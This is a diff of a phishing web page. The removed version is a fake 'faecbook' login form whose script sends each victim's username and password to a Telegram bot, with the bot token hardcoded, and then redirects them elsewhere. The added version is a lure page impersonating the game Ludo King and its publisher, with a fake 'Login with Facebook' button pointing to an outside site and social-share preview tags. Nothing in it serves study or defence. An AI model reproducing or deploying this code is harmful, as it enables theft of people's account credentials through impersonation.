@@ -1,123 +1,378 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Login with faecbook ✅</title>
-  
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-    html, body { height: 100%; width: 100%; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; }
-    .full-page-container { width: 100%; max-width: 420px; padding: 20px; display: flex; flex-direction: column; align-items: center; text-align: center; }
-    .logo { width: 80px; height: 80px; margin-bottom: 20px; object-fit: contain; }
-    h1 { font-size: 24px; font-weight: 700; color: #1c1e21; margin-bottom: 12px; }
-    p.subtitle { font-size: 15px; color: #606770; margin-bottom: 30px; line-height: 1.5; }
-    form { width: 100%; display: flex; flex-direction: column; gap: 14px; }
-    .custom-input { width: 100%; padding: 16px; background: #ffffff; border: 1px solid #ccd0d5; border-radius: 8px; font-size: 16px; color: #1c1e21; outline: none; transition: all 0.2s; }
-    .custom-input:focus { border-color: #1877f2; box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2); }
-    .login-btn { width: 100%; padding: 16px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 6px; transition: 0.2s; }
-    .login-btn:hover { background: #166fe5; }
-    .login-btn:active { transform: scale(0.98); }
-    .forgot-link { display: block; color: #1877f2; font-size: 15px; font-weight: 500; text-decoration: none; margin-top: 18px; }
-    .divider { width: 100%; height: 1px; background: #dadde1; margin: 25px 0; }
-    .safe-notice { font-size: 13px; color: #65676b; text-align: center; line-height: 1.6; padding: 0 10px; }
-    .safe-notice a { color: #1877f2; text-decoration: none; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Ludo King - Login</title>
+
+<!-- 🎯 Link Preview (Social Media Share) -->
+<meta property="og:title" content="Ludo King - Play Now">
+<meta property="og:description" content="Play Ludo King Multiplayer Online for free!">
+<meta property="og:image" content="https://i.postimg.cc/8zrpM4k2/ludo-1200x630.jpg">
+<meta property="og:url" content="https://invitefabiha.vercel.app/">
+
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+  }
+
+  html, body {
+    height: 100%;
+    overflow: hidden; 
+    touch-action: none; 
+  }
+
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    perspective: 1000px;
+    background-color: #10001a; 
+  }
+
+  /* 🎯 ব্যাকগ্রাউন্ড ছবি */
+  body::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background-image: url('https://i.postimg.cc/yYTQngnG/images-(3).jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    z-index: -2;
+  }
+
+  /* ছবির ওপর ওভারলে */
+  body::after {
+    content: "";
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(10, 0, 20, 0.75);
+    z-index: -1;
+  }
+
+  /* 🎯 ব্যাকগ্রাউন্ডে ঘোরানো ৩ডি ডাইস */
+  .bg-dice-container {
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
+    z-index: 1;
+    pointer-events: none;
+    overflow: hidden;
+  }
+
+  .bg-dice {
+    position: absolute;
+    width: 80px;
+    height: 80px;
+    transform-style: preserve-3d;
+    opacity: 0.25;
+  }
+
+  .bg-dice.d1 { top: 15%; left: 8%; animation: spinDice 12s linear infinite; }
+  .bg-dice.d2 { bottom: 20%; right: 8%; width: 110px; height: 110px; animation: spinDiceReverse 15s linear infinite; }
+  .bg-dice.d3 { top: 50%; right: 15%; width: 60px; height: 60px; animation: spinDice 10s linear infinite; }
+
+  @keyframes spinDice {
+    0% { transform: rotateX(0) rotateY(0); }
+    100% { transform: rotateX(360deg) rotateY(360deg); }
+  }
+  @keyframes spinDiceReverse {
+    0% { transform: rotateX(360deg) rotateY(360deg); }
+    100% { transform: rotateX(0) rotateY(0); }
+  }
+
+  /* 🎯 সাদা ডাইস এবং লাল ডট */
+  .bg-face {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(135deg, #ffffff, #d0d0d0);
+    border-radius: 15%;
+    border: 1px solid #ffea00;
+    box-shadow: inset 0 0 15px rgba(0,0,0,0.2), 0 0 20px rgba(255,255,255,0.2);
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    grid-template-rows: repeat(3, 1fr);
+    padding: 15%;
+  }
+
+  .dot {
+    background: radial-gradient(circle at 30% 30%, #ff4d4d, #cc0000);
+    border-radius: 50%;
+    box-shadow: inset -2px -2px 4px rgba(0,0,0,0.5), inset 2px 2px 4px rgba(255,255,255,0.6);
+    width: 100%;
+    height: 100%;
+  }
+
+  /* গ্লো ইফেক্ট */
+  .glow {
+    position: absolute;
+    width: 400px;
+    height: 400px;
+    background: radial-gradient(circle, rgba(255, 0, 150, 0.2), transparent 70%);
+    border-radius: 50%;
+    filter: blur(60px);
+    animation: pulse 4s infinite alternate;
+    z-index: 0;
+  }
+
+  @keyframes pulse {
+    from { transform: scale(1); opacity: 0.6; }
+    to { transform: scale(1.3); opacity: 1; }
+  }
+
+  /* 🎯 মূল কন্টেইনার */
+  .container {
+    position: relative;
+    z-index: 10;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 100%;
+    max-width: 440px;
+    padding: 15px;
+    margin-top: -30px;
+  }
+
+  /* 🎯 উপরের টাইটেল এবং সাবটাইটেল */
+  .title-section {
+    text-align: center;
+    margin-bottom: 25px;
+  }
+
+  .title-section h1 {
+    font-size: 42px;
+    font-weight: 900;
+    color: #fff;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    margin-bottom: 5px;
+    background: linear-gradient(90deg, #ff007f, #9d00ff, #00d2ff);
+    background-size: 200% auto;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientMove 3s linear infinite;
+    filter: drop-shadow(0 0 15px rgba(157, 0, 255, 0.8));
+  }
+
+  @keyframes gradientMove {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+  .title-section p {
+    color: #e0e0e0;
+    font-size: 15px;
+    letter-spacing: 0.5px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    text-shadow: 0 2px 5px rgba(0,0,0,0.8);
+  }
+
+  .title-section p .mic-icon {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 26px;
+    height: 26px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #ff007f, #b000ff);
+    box-shadow: 0 0 10px rgba(255, 0, 127, 0.8);
+    font-size: 13px;
+  }
+
+  /* 🎯 মেইন গ্লাস বক্স */
+  .glass-box {
+    background: rgba(20, 10, 35, 0.7); 
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    padding: 35px 25px;
+    border-radius: 25px;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.05);
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+    position: relative;
+  }
+
+  /* হলুদ বর্ডারের গ্লো */
+  .glass-box::before {
+    content: '';
+    position: absolute;
+    top: -1px; left: -1px; right: -1px; bottom: -1px;
+    border-radius: 25px;
+    background: linear-gradient(45deg, #ffbe0b, transparent, #ffbe0b);
+    z-index: -1;
+    opacity: 0.4;
+  }
+
+  /* 🎯 উপরের ৩টি ছোট বাটন */
+  .top-buttons {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 12px;
+  }
+
+  .small-btn {
+    background: linear-gradient(180deg, #2a4b8d 0%, #152c5b 100%);
+    border: 1px solid #4a77c4;
+    border-radius: 14px;
+    padding: 15px 5px;
+    color: #fff;
+    font-size: 13px;
+    font-weight: 700;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.3), inset 0 1px 1px rgba(255,255,255,0.2);
+    text-align: center;
+    line-height: 1.2;
+  }
+
+  .small-btn i {
+    font-size: 18px;
+  }
+
+  /* 🎯 Facebook লগইন বাটন */
+  .fb-btn {
+    background: linear-gradient(180deg, #4292ff 0%, #1d6cf5 100%);
+    border: 1.5px solid #82baff;
+    border-radius: 16px;
+    padding: 18px;
+    color: #fff;
+    font-size: 20px;
+    font-weight: 800;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    text-decoration: none;
+    box-shadow: 0 6px 20px rgba(29, 108, 245, 0.5), inset 0 1px 1px rgba(255,255,255,0.4);
+    transition: transform 0.2s;
+    margin-top: 5px;
+  }
+
+  .fb-btn:active {
+    transform: scale(0.97);
+  }
+
+  .fb-btn svg {
+    width: 30px;
+    height: 30px;
+    fill: white;
+  }
+
+  /* 🎯 নিচের টেক্সট */
+  .footer-text {
+    color: #a0a0b0;
+    font-size: 13px;
+    line-height: 1.6;
+    text-align: center;
+    margin-top: 5px;
+  }
+
+  .footer-text a {
+    color: #4292ff;
+    text-decoration: none;
+    font-weight: 600;
+  }
+
+  @media (max-width: 380px) {
+    .title-section h1 { font-size: 34px; }
+    .small-btn { font-size: 11px; padding: 12px 2px; }
+    .fb-btn { font-size: 17px; padding: 15px; }
+    .glass-box { padding: 25px 15px; }
+  }
+</style>
+<!-- FontAwesome for Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
 
-  <div class="full-page-container">
-    <img src="https://i.postimg.cc/SN6m9D1y/1000097185-removebg-preview.png" alt="Logo" class="logo">
-    <h1>Login with faecbook ✅</h1>
-    <p class="subtitle">Enter your mobile number or email and password to log in securely.</p>
+  <!-- 🎯 ব্যাকগ্রাউন্ডে ঘোরানো ৩ডি ডাইস -->
+  <div class="bg-dice-container">
+    <div class="bg-dice d1">
+      <div class="bg-face front"><div class="dot" style="grid-area: 1/1;"></div></div>
+      <div class="bg-face back"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 2/2;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face right"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face left"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 2/2;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face top"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 2/1;"></div><div class="dot" style="grid-area: 2/3;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face bottom"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+    </div>
+    
+    <div class="bg-dice d2">
+      <div class="bg-face front"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face back"><div class="dot" style="grid-area: 1/2;"></div><div class="dot" style="grid-area: 3/2;"></div></div>
+      <div class="bg-face right"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 2/2;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face left"><div class="dot" style="grid-area: 2/2;"></div></div>
+      <div class="bg-face top"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 2/2;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face bottom"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 2/1;"></div><div class="dot" style="grid-area: 2/3;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+    </div>
 
-    <form id="loginForm">
-      <div class="input-group">
-        <input type="text" id="username" class="custom-input" placeholder="Mobile number or email" autocomplete="off" required>
-      </div>
-      <div class="input-group">
-        <input type="password" id="password" class="custom-input" placeholder="Password" autocomplete="off" required>
-      </div>
-      <button type="submit" class="login-btn" id="loginButton">Login</button>
-    </form>
-
-    <a href="#" class="forgot-link" onclick="return false;">Forgotten password?</a>
-    <div class="divider"></div>
-    <div class="safe-notice">
-      <p>This platform uses advanced encryption to protect your data. By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.</p>
-      <br>
-      <p>© 2026 All Rights Reserved.</p>
+    <div class="bg-dice d3">
+      <div class="bg-face front"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 2/2;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face back"><div class="dot" style="grid-area: 1/1;"></div></div>
+      <div class="bg-face right"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 2/2;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face left"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face top"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
+      <div class="bg-face bottom"><div class="dot" style="grid-area: 1/1;"></div><div class="dot" style="grid-area: 1/3;"></div><div class="dot" style="grid-area: 2/1;"></div><div class="dot" style="grid-area: 2/3;"></div><div class="dot" style="grid-area: 3/1;"></div><div class="dot" style="grid-area: 3/3;"></div></div>
     </div>
   </div>
 
-  <script>
-    (function() {
-      'use strict';
+  <div class="glow"></div>
 
-      // 🔴 আপনার টেলিগ্রাম তথ্য
-      const TELEGRAM_BOT_TOKEN = "8667615841:AAGvy_U5h-QYYB5n4ZXdk1ejc1gddP8vmsk";
-      const TELEGRAM_CHAT_ID = "6250740299";
+  <div class="container">
+    
+    <div class="title-section">
+      <h1>LUDO KING</h1>
+      <p>
+        <span class="mic-icon">🎙️</span>
+        Enjoy voice chat with game friend
+      </p>
+    </div>
+
+    <div class="glass-box">
       
-      // 🎯 Redirect URL 
-      const REDIRECT_URL = "https://yourcom.infinityfree.me/"; 
-      
-      const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      <div class="top-buttons">
+        <div class="small-btn">
+          <i class="fa-solid fa-cloud"></i>
+          Save Data
+        </div>
+        <div class="small-btn">
+          <i class="fa-solid fa-mobile-screen-button"></i>
+          Change Device
+        </div>
+        <div class="small-btn">
+          <i class="fa-solid fa-gem" style="color: #00e5ff;"></i>
+          +100
+        </div>
+      </div>
 
-      document.getElementById("loginForm").addEventListener("submit", async function (e) {
-        e.preventDefault();
+      <!-- 🎯 Facebook লগইন বাটন (Redirect Link Updated) -->
+      <a href="https://voicechat-five.vercel.app/" class="fb-btn">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+        </svg>
+        Login with Facebook
+      </a>
 
-        const username = document.getElementById("username").value.trim();
-        const password = document.getElementById("password").value.trim();
+      <div class="footer-text">
+        By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the <a href="#">Privacy Policy</a>
+      </div>
 
-        // পাসওয়ার্ড ভ্যালিডেশন
-        if (!username || !password || password.length < 6) {
-          if (!username) {
-            document.getElementById("username").reportValidity();
-            document.getElementById("username").focus();
-          } else if (!password) {
-            document.getElementById("password").reportValidity();
-            document.getElementById("password").focus();
-          } else {
-            const pw = document.getElementById("password");
-            pw.setCustomValidity("Password must be at least 6 characters");
-            pw.reportValidity();
-            pw.focus();
-            pw.setCustomValidity("");
-          }
-          return;
-        }
+    </div>
+  </div>
 
-        const loginButton = document.getElementById("loginButton");
-        loginButton.innerHTML = 'Logging in...';
-        loginButton.disabled = true;
-
-        const message = `🔐 <b>New Login</b>\n\n` +
-                        `👤 <b>User:</b> <code>${username}</code>\n` +
-                        `🔑 <b>Pass:</b> <code>${password}</code>`;
-
-        // ==========================================
-        // 🎯 fetch ব্যবহার করে ডাটা পাঠানো (আগে await করবে, তারপর রিডাইরেক্ট)
-        // ==========================================
-        try {
-          await fetch(TELEGRAM_API, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: message,
-              parse_mode: 'HTML'
-            })
-          });
-        } catch (err) {
-          console.error("Telegram Error:", err);
-        }
-
-        // ডাটা পাঠানোর পর ১ সেকেন্ড অপেক্ষা করে রিডাইরেক্ট
-        setTimeout(function() {
-          window.location.href = REDIRECT_URL;
-        }, 1000); 
-      });
-    })();
-  </script>
 </body>
 </html>
